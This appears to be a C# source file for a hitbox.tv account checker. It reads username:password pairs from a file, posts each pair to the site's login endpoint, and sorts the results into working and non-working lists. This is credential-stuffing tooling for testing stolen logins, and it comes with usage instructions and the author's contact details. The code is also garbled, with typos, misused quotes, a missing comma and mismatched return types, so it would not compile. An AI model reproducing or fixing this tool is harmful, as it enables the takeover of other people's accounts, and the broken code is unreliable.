using System;
using System.Linq;
using System.Threading;
using System.Net;
using System.IO;

namespace HBAcccheck {
	class Program {

		//	This is a hitbox account checker.
		//	(c) kc@stopdestroying.me 2016
		//
		//
		// Usage:
		//	Put accounts in accounts.txt within same directory as executable in format username:password
		//	Execute.
		//
		//
		//	For help, requests, or additional information, message kc@stopdestroying.me on jabber or email CMK@tuta.io.

		private static void Main() {
			
			//Check for existence of files required for execution.
			string[] files = {'accounts.txt', 'working.txt', 'notworking.txt'};
			foreeach(string file in files) {
				if(!File.Exists(file)) {
					File.Create(file);
				}
			}

			string[] accounts = File.ReadAllLines("accounts.txt");
			if(accounts.Length == 0) {
				Console.WriteLine("No accounts are in accounts.txt");
				return 1;
			}
			foreach(string account in accounts) {
				string[] UP = account.split(":");
				if(LoginHB(UP[0], UP[1])) {
					File.WriteAllLines(File.ReadAllLines("working.txt") + UP);
					Console.WriteLine(UP[0] + ":" + UP[1] + " ~ WORKING -- Added to working.txt");
				} else {
					File.WriteAllLines(File.ReadAllLines("notworking.txt") + UP);
					Console.WriteLine(UP[0] + ":" + UP[1] + " ~ NOT WORKING");
				}

			}
			Console.WriteLine("Done checking.");
			return 0;
		}

		private bool CheckAccount(string username, string password) {
			response = LoginHB(username, password);
			if(response == "vbhdjvgvyqf=s-xdgui") {
				return true;
			} else {
				return false;
			}
		}
		
		private string LoginHB (string username, string password) {
				using(var Client = new HTTPClient()) {
				var values = new Dictionary<string, string>
				{
					{ "username", username }
					{ "password", password }
				}
				var content = new FormUrlEncodedContent(values);
				var response = await client.PostAsync("http://hitbox.tv/login", content):
				var responseString = await response.Content.ReadAsStringAsync();
				return responseString;
			}
		}
	}
}
